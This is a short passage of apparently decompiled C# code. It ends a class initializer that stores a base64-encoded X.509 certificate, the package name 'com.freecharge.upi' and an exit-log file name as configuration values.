TBZBgNVHR8EUjBQMCSgIqAghh5odHRwOi8v\r\nMTAuMC42NS42NS9jcmxfMjdCMC5jcmwwKKAmoCSGImh0dHA6Ly9pZHJidGNhLm9y\r\nZy5pbi9jcmxfMjdCMC5jcmwwSwYDVR0gBEQwQjBABgZggmRkAgMwNjA0BggrBgEF\r\nBQcCAjAoHiYAQwBsAGEAcwBzACAAMwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZTAN\r\nBgkqhkiG9w0BAQsFAAOCAQEAgTGy69Tnzk5nzAZLQJ5Fs018kJbNy10HErBblWM+\r\na5rb0ifrJE5uDSTAdo/P5Q3PbDzxVmR6burisFzkFu+XzU9OBFlCehScUu/fC9eE\r\njdVLj012FziUx1bI3nRHT3trKKTa5DmjHCOVPJLA5MYrvT1hyarvh9Sy3U9FKk5o\r\n8R9aosF2+13FPZEGB01wknHH4Wwqyc/lhPyJPogSUC1aEMgejTPSK9TcKj/7iwio\r\n0wDuZFkePSZ477lP0tzoZIPRSt1A4DtkGsPcj7ZXAxgNzd+Vhcbs4rIqnhTxKNPH\r\nGT/lq4JcieGjxO3udPCLEnkDsXVqI0Ov4N0W5g0SvbBLVw==\r\n-----END CERTIFICATE-----\r\n";
		x509CertSecondService = text3;
		string text4 = "com.freecharge.upi";
		packageName = text4;
		string text5 = "Log_ExitF.txt";
		logExitFile = text5;
	}
}
